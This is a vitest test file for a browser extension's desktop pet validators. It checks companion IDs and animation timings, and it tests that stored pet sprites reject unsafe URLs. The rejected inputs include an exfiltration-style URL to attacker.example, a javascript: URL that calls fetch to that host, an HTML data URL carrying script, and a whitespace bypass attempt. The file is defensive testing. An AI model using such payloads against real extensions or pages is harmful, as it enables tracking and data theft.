import { describe, expect, it } from 'vitest';
import { isBuiltInCompanionId, isStoredDesktopPet } from './octoPetState';
import { getCompanionPassDurationMs } from './octoBuiltInCompanion';

describe('isBuiltInCompanionId', () => {
  it.each(['ant', 'snail', 'wizard', 'zombie'])('accepts built-in companion %s', (id) => {
    expect(isBuiltInCompanionId(id)).toBe(true);
  });

  it.each([undefined, null, '', 'cat', 4])('rejects unsupported value %s', (value) => {
    expect(isBuiltInCompanionId(value)).toBe(false);
  });
});

describe('getCompanionPassDurationMs', () => {
  it('keeps the snail awake for its complete slow crossing', () => {
    expect(getCompanionPassDurationMs('snail')).toBe(22_000);
  });

  it('uses each companion animation duration', () => {
    expect(getCompanionPassDurationMs('ant')).toBe(13_000);
    expect(getCompanionPassDurationMs('wizard')).toBe(15_000);
    expect(getCompanionPassDurationMs('zombie')).toBe(18_000);
  });
});

/**
 * The pet validators are the only thing standing between a forged
 * `window.postMessage` and an outbound network request made by the extension.
 * MAIN world code shares a realm with the page and cannot be isolated from it,
 * so these checks are the actual security boundary — not the transport.
 */
describe('isStoredDesktopPet as a security boundary', () => {
  const validManifest = {
    id: 'p',
    displayName: 'P',
    spritesheetPath: 's.webp',
    columns: 1,
    rows: 1,
    frameDurationMs: 100,
    animations: { idle: { row: 0, frames: 1 } },
    stateAnimations: { idle: 'idle' },
  };
  const pet = (spritesheetDataUrl: unknown) => ({
    manifest: validManifest,
    spritesheetDataUrl,
    importedAt: 1,
  });

  it('accepts a genuine base64 data URL', () => {
    expect(isStoredDesktopPet(pet('data:image/webp;base64,AAAA'))).toBe(true);
  });

  it.each([
    ['remote http', 'https://attacker.example/exfil.png?user=victim'],
    ['protocol-relative', '//attacker.example/x.png'],
    ['non-image data URL', 'data:text/html;base64,PHNjcmlwdD4='],
    ['unlisted image type', 'data:image/svg+xml;base64,PHN2Zy8+'],
    ['data URL without base64', 'data:image/png,rawbytes'],
    ['javascript URL', 'javascript:fetch("//attacker.example")'],
    ['blob URL', 'blob:https://im.example/abc'],
    ['leading whitespace bypass attempt', ' data:image/png;base64,AAAA'],
    ['not a string', 123],
  ])('rejects %s', (_label, url) => {
    expect(isStoredDesktopPet(pet(url))).toBe(false);
  });
});
